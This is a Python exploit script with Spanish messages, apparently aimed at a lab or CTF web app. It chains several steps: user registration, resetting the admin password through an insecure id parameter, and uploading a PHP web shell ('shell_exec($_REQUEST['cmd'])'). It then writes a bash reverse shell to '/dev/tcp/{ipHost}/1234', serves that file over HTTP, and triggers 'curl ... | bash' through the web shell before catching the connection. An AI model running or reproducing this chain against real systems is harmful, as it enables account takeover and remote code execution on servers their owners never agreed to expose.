import requests,subprocess,socket
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 3:
    print(f'[!] Uso: python3 {sys.argv[0]} "Tu IP"  "Ip de la víctima"\n' )
    sys.exit(1)

print("[!] Asegurarse de no haber creado ningún usuario, en caso contrario modificar el id en urlIndex")
sleep(1)
ipHost= sys.argv[1]
ipVic= sys.argv[2]

urlIndex = f'http://{ipVic}/dashboard.php?id=2' # Modificar id si ya has creado usuarios.
urlAdmin = f'http://{ipVic}/dashboard.php?id=1'
urlRegister= f'http://{ipVic}/register.php'
urlLogin= f'http://{ipVic}/login.php'

usr= "testo"
passw= "testo"

s = requests.Session()

def register():

    post_data = { 
        "username": f'{usr}',
        "email": f'{usr}%20{usr}',
        "password": f'{passw}'
     }

    r = s.post(urlRegister,data=post_data)
    print("[+] Usuario creado")

def login():

    post_data = { 
       "username": f'{usr}',
       "password": f'{passw}'
     }

    r = s.post(urlLogin,data=post_data)

def changePass():

    post_data= {

        "password": "password",
        "id": "1"

    }
    r = s.post(urlIndex,data=post_data)
    print("[+] Contraseña de admin cambiada con éxito")

def loginadmin():

     post_data = { 
       "username": "admin",
       "password": "password"
     }

     r = s.post(urlLogin,data=post_data)


def upload():

        payload = """  <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?> """ 

        files  = {'fileToUpload':('shell.phtml',payload)

            }
        print("[+] Subiendo archivo malicoso")
        r = s.post(urlAdmin,files=files)

def html_payload():

    with open("index.html","w") as file:
        Shebang = "#!/bin/bash\n"
        payload =f'bash -i >& /dev/tcp/{ipHost}/1234 0>&1'
        file.write(Shebang)
        file.write(payload)

def http_server():

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:
            so.bind(('localhost', 80))
            http_server = subprocess.Popen(["python3", "-m", "http.server", "80"])
    except OSError:
            print("\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor")

def conection():

    ip = f'http://{ipVic}/upload/shell.phtml?cmd=curl%20{ipHost}%20|%20bash'
    r = s.get(ip)

if __name__ == '__main__':
    register()
    login()
    changePass()
    loginadmin()
    upload()
    html_payload()
    threading.Thread(target=conection, args=()).start()
    shell = listen(1234,timeout=20).wait_for_connection()
    shell.interactive()
